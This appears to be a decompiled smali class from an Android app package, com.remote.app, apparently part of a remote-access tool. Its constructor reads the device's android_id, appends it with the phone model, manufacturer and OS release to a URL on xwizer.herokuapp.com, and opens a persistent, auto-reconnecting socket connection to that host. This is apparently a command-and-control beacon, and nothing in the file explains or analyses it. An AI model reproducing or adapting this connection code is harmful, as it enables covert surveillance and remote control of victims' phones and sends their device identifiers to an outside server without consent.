.class public Lcom/remote/app/h;
.super Ljava/lang/Object;
.source ""


# static fields
.field private static a:Lcom/remote/app/h;


# instance fields
.field private b:Lb/a/b/I;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Lcom/remote/app/h;

    invoke-direct {v0}, Lcom/remote/app/h;-><init>()V

    sput-object v0, Lcom/remote/app/h;->a:Lcom/remote/app/h;

    return-void
.end method

.method private constructor <init>()V
    .locals 4

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    :try_start_0
    invoke-static {}, Lcom/remote/app/MainService;->a()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "android_id"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lb/a/b/b$a;

    invoke-direct {v1}, Lb/a/b/b$a;-><init>()V

    const/4 v2, 0x1

    iput-boolean v2, v1, Lb/a/b/w$c;->t:Z

    const-wide/16 v2, 0x1388

    iput-wide v2, v1, Lb/a/b/w$c;->v:J

    const-wide/32 v2, 0x3b9ac9ff

    iput-wide v2, v1, Lb/a/b/w$c;->w:J

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "http://xwizer.herokuapp.com:80?model="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v2}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "&manf="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "&release="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "&id="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lb/a/b/b;->a(Ljava/lang/String;)Lb/a/b/I;

    move-result-object v0

    iput-object v0, p0, Lcom/remote/app/h;->b:Lb/a/b/I;
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/net/URISyntaxException;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static a()Lcom/remote/app/h;
    .locals 1

    sget-object v0, Lcom/remote/app/h;->a:Lcom/remote/app/h;

    return-object v0
.end method


# virtual methods
.method public b()Lb/a/b/I;
    .locals 1

    iget-object v0, p0, Lcom/remote/app/h;->b:Lb/a/b/I;

    return-object v0
.end method
